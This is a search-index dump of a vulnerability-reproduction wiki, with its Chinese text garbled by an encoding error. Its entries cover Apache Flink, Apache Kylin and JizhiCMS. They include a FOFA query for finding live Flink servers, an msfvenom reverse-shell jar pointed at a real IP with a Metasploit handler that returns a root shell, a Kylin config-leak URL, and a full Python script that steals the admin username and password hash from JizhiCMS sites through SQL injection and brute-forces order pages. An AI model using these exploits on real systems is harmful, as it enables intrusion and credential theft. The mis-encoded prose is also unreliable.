{"./":{"url":"./","title":"å…³äºæ–‡åº“","keywords":"","body":"PeiQI WiKiæ–‡åº“ å…³äºæ–‡åº“ æ­å»ºäº†ä¸€ä¸ªæ¼æ´å¤ç° WIKI æ–‡åº“ï¼Œç”¨äºæ—¥å¸¸è®°å½•ä¸€äº›æ¼æ´å¤ç°ğŸ˜„ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-10-29 23:36:51 "},"PeiQi_Wiki/middleware_wiki/":{"url":"PeiQi_Wiki/middleware_wiki/","title":"ä¸­é—´ä»¶æ¼æ´","keywords":"","body":"ä¸­é—´ä»¶æ¼æ´ğŸ¦” PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-10-31 13:09:30 "},"PeiQi_Wiki/middleware_wiki/Apache/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/","title":"Apache","keywords":"","body":"Apache æ¼æ´æ•´ç†ğŸ‘» Apache Flink Apache Flink Apache Kylin Apache-kylin æœªæˆæƒé…ç½®æ³„éœ² PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 11:44:35 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:16:41 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ.html","title":"Apache Flink  <= 1.9.1(æœ€æ–°ç‰ˆæœ¬) è¿œç¨‹ä»£ç æ‰§è¡Œåå¼¹shell ","keywords":"","body":"Apache Flink FOFA FOFA è¯­å¥ app=\"Apache-Flink\" && country=\"CN\" å›½å†…è¿˜æ˜¯å¾ˆå¤šä½¿ç”¨ Apache Flink çš„ï¼Œå¤§æ¦‚æœ‰1000çš„æ•°é‡å·¦å³ æ¼æ´å¤ç° éšä¾¿æ‰“å¼€ä¸€ä¸ªä½¿ç”¨ Apache Flink çš„ç½‘ç«™ï¼Œæ‰“å¼€åé¡µé¢ä¸ºè¿™æ ·å­ ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ é¡µé¢ æ‰“å¼€MSF ç”Ÿæˆä¸€ä¸ª jar æœ¨é©¬ msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123 LPORT=4444 -f jar > test.jar ç‚¹å‡» Add ä¸Šä¼  jar æ–‡ä»¶ ç›‘å¬ç«¯å£ msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run ç‚¹å‡»ä¸‹ submit åå¼¹å›æ¥ä¸€ä¸ªroot æƒé™shell PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-10-31 22:51:21 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin æœªæˆæƒé…ç½®æ³„éœ² PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 11:16:55 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html","title":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²","keywords":"","body":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² å—å½±å“çš„ç‰ˆæœ¬ï¼š Apache Kylin æœ‰ä¸€ä¸ªrestful apiä¼šåœ¨æ²¡æœ‰è®¤å¯è®¤è¯çš„æƒ…å†µä¸‹æš´éœ²é…ç½®ä¿¡æ¯ã€‚ Kylin 2.x.x Kylin Kylin 4.0.0-alpha æ¼æ´åˆ©ç”¨ æ ¹æ®æ¼æ´æƒ…æŠ¥ æ¼æ´åˆ©ç”¨POCä¸ºhttp://xxx.xxx.xxx.xxx/kylin/api/admin/config å‚è€ƒ CVE-2020-13937|Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²æ¼æ´ï¼Œè…¾è®¯å®‰å…¨å…¨é¢æ”¯æŒæ£€æµ‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 11:42:09 "},"PeiQi_Wiki/cms_wiki/":{"url":"PeiQi_Wiki/cms_wiki/","title":"CMSæ¼æ´","keywords":"","body":"CMS æ¼æ´æ•´ç†ğŸ‘» æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™) æè‡´CMS å­˜å‚¨å‹XSS æè‡´CMS æè‡´cms 1.71,1.7,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶SQLæ³¨å…¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:47:44 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/","title":"æè‡´CMS","keywords":"","body":"æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„ä»£ç æ‰§è¡Œ(åå°æƒé™) æè‡´CMS 1.71 ,1.7 ,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶sqlæ³¨å…¥ æè‡´CMS å­˜å‚¨å‹XSS PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:17:29 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æè‡´CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™)","keywords":"","body":"æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶(åå°) ç™»é™†åå°æŸ¥çœ‹æ’ä»¶å¤„ï¼Œæœ‰ä¸€ä¸ªåå°ç¼–è¾‘çš„æ’ä»¶ å®‰è£…ä¹‹åè®¾ç½®å¯†ç å¹¶ä½¿ç”¨å¦‚æœå·²ç»è®¾æœ‰å¯†ç ï¼Œé‡æ–°å®‰è£…æ’ä»¶å³å¯è§£å†³å¯†ç æœªçŸ¥é—®é¢˜ ä¿®æ”¹ä¸ºphpä»£ç  æˆåŠŸæ‰§è¡Œphpä»£ç çš„å‘½ä»¤ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:52:44 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html","title":"æè‡´CMS 1.71 + 1.7 + 1.67 ç‰ˆæœ¬sqlæ³¨å…¥","keywords":"","body":"æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥(æ”¯ä»˜æ’ä»¶) æŸ¥çœ‹ä¸€ä¸‹è¿›è¡Œè¿‡æ»¤çš„å‡½æ•° /** å‚æ•°è¿‡æ»¤ï¼Œæ ¼å¼åŒ– **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://æ•´æ•° return (int)$value; case 1://å­—ç¬¦ä¸² $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://æ•°ç»„ if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://æµ®ç‚¹ return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //è¿‡æ»¤XSSæ”»å‡» function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸² $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ } else { SafeFilter($arr[$key]); } } } } çœ‹ä¸€ä¸‹æ‰§è¡Œçš„SQLè¯­å¥çš„å‡½æ•° // æŸ¥è¯¢ä¸€æ¡ public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } è·Ÿè¿› findAll å‡½æ•° // æŸ¥è¯¢æ‰€æœ‰ public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } åœ¨è·Ÿè¿›ä¸€ä¸‹getDataå‡½æ•° //è·å–æ•°æ® public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } è·Ÿè¿›queryæ‰§è¡Œå‡½æ•° //æ‰§è¡ŒSQLè¯­å¥å¹¶æ£€æŸ¥æ˜¯å¦é”™è¯¯ public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('æ•°æ®åº“é”™è¯¯ï¼š' . $msg[2] . end($this->filter)); } } çœ‹åˆ°$msg = $this->pdo->errorInfo();è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæŠŠæ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åœ¨é¡µé¢ä¸Šå¹¶æ˜¾ç¤ºå‡ºæ¥å¹¶é€€å‡º ä¸€å¥—åˆ†æä¸‹æ¥æ²¡æœ‰å‘ç°å¯¹sqlè¯­å¥çš„è¿‡æ»¤ï¼Œå¦‚æœå¾—åˆ°çš„æ•°æ®æ²¡æœ‰ç»è¿‡format_paramè¿‡æ»¤ï¼Œä¼šäº§ç”Ÿæ³¨å…¥ ä¾‹å¦‚: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } å¦‚æœç›´æ¥è¿™æ ·GET POST REQUEST å¸¦å…¥æ•°æ®åº“ ä¼šäº§ç”ŸæŠ¥é”™æ³¨å…¥ ä¾‹å¦‚ ./exploit/name=123' (åŠ ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™ï¼Œå¦‚æœå¼•å·æ²¡è¿‡æ»¤) ç°åœ¨åªéœ€è¦å¯»æ‰¾ç±»å‹æ˜¯è¿™æ ·æ²¡è¿‡æ»¤ç›´æ¥å¸¦å…¥æ•°æ®åº“çš„è¯­å¥å°±è¡Œäº† ç®€å•å¯»æ‰¾ä¸‹å…¶å®è¿™æ ·çš„åœ°æ–¹æŒºå¤šçš„ï¼Œæ‹¿ä¸€ä¸ªä½ç½®ä¸¾ä¾‹å­ è¿™é‡Œæ˜¯ä¸€ä¸ªæ”¯ä»˜æ’ä»¶çš„ä½ç½®ï¼Œè“è‰²æ–¹å—1å¢åŠ ä»£ç æ¨¡æ‹Ÿå¼€é€šæ”¯ä»˜å®åŠŸèƒ½é€šè¿‡éªŒè¯ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åªä½¿ç”¨[htmlspecialchars]æ¥è¿‡æ»¤äº†xssï¼Œsqlè¯­å¥æ²¡æœ‰è¿‡æ»¤ï¼Œç”¨åˆšåˆšçš„æ–¹æ³•æ¥æ³¨å…¥ å¯ä»¥çœ‹åˆ°çš„ç¡®å‡ºç°äº†sqlè¯­å¥å’Œæ•°æ®åº“é”™è¯¯ ç›´æ¥æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" å®˜ç½‘url : https://www.jizhicms.cn/ \"\"\" def main(): print( 'â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—\\n' 'â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘\\n' 'â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘\\n' 'â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•\\n' 'â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—\\n' 'â•šâ•â• â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•šâ•â• â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•\\n' ' æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬sqlæ³¨å…¥poc + çˆ†ç ´ç”¨æˆ·è´­ç‰©è½¦é¡µé¢ \\n' ' from : http://www.peiqi.tech ') while True: poc = str(input('é€‰æ‹©ä½¿ç”¨çš„pocï¼š\\n' '1.sqlæ³¨å…¥\\n' '2.ç”¨æˆ·è´­ç‰©è½¦çˆ†ç ´\\n' '3.GET ç½‘ç«™ç®¡ç†å‘˜è´¦å·å¯†ç \\n' '4.é€€å‡º quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('å‚æ•°é”™è¯¯ï¼Œé‡æ–°è¾“å…¥') def poc_1(): ## poc_1 ---> sqlæ³¨å…¥æ¼æ´ç‚¹( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //æ”¯ä»˜å®å…¬é’¥ï¼Œè´¦æˆ·ä¸­å¿ƒ->å¯†é’¥ç®¡ç†->å¼€æ”¾å¹³å°å¯†é’¥ï¼Œæ‰¾åˆ°æ·»åŠ äº†æ”¯ä»˜åŠŸèƒ½çš„åº”ç”¨ï¼Œæ ¹æ®ä½ çš„åŠ å¯†ç±»å‹ï¼ŒæŸ¥çœ‹æ”¯ä»˜å®å…¬é’¥ $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //éªŒè¯ç­¾å $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; ä»˜æ¬¾æˆåŠŸ'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); å‘å¸ƒæ—¶é—´ 2020-05-25]') else: print('å¾—åˆ°çš„æ•°æ®ä¸º:\\n', data) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> ç”¨æˆ·è´­ç‰©è½¦é¡µé¢è·å– (Home/c/UserController.php [orderdetails]) ## æ¼æ´ç‚¹ ---> æ— ç”¨æˆ·cookie id çš„éªŒè¯ ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.8ä»¥ä¸‹å…¨ç‰ˆæœ¬ (å½“å‰æœ€æ–° v1.8 æ›´æ–°æ—¶é—´:6æœˆ30æ—¥) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //è¶…æ—¶æˆ–è€…å·²æ”¯ä»˜ if($order['isshow']==0){ $msg = 'è®¢å•å·²åˆ é™¤'; } if($order['isshow']==3){ $msg = 'è®¢å•å·²è¿‡æœŸï¼Œä¸å¯æ”¯ä»˜ï¼'; } if($order['isshow']==2){ $msg = 'è®¢å•å·²æ”¯ä»˜ï¼Œè¯·å‹¿é‡å¤æ“ä½œï¼'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //å…¼å®¹å¤šæ¨¡å—åŒ– if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) year_day = str(input(\"è¾“å…¥æ—¥æœŸ(ä¾‹å¦‚:20200712):\")) shop = [] # éå†æ‰€æœ‰å‡ºç°çš„ç”¨æˆ·è´­ç‰©è½¦é¡µé¢ for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # æ‰“å°ç»“æœ if 'æ€»é‡‘é¢' in response.text: print('è´­ç‰©è½¦é¡µé¢ï¼š',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> å¾—åˆ°è´¦å·å¯†ç  ( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ ---> æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # ç”¨æˆ·å + å¯†ç  é•¿åº¦ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # å¾—åˆ°è´¦å·å¯†ç ï¼Œå¯†ç md5æ ¼å¼ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # åˆ†å‰²è´¦å·å¯†ç  admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"æˆåŠŸå¾—åˆ°è´¦å·å¯†ç ï¼š\\n\" \"ç”¨æˆ·å:\",admin, \"\\nå¯†ç (md5):\",passwd) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() è´­ç‰©è½¦çˆ†ç ´æ²¡æœ‰åˆ©ç”¨ç‚¹ï¼Œå…³äºå®¡è®¡éƒ¨åˆ†å‚è€ƒæè‡´CMSå®¡è®¡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 11:11:49 "}}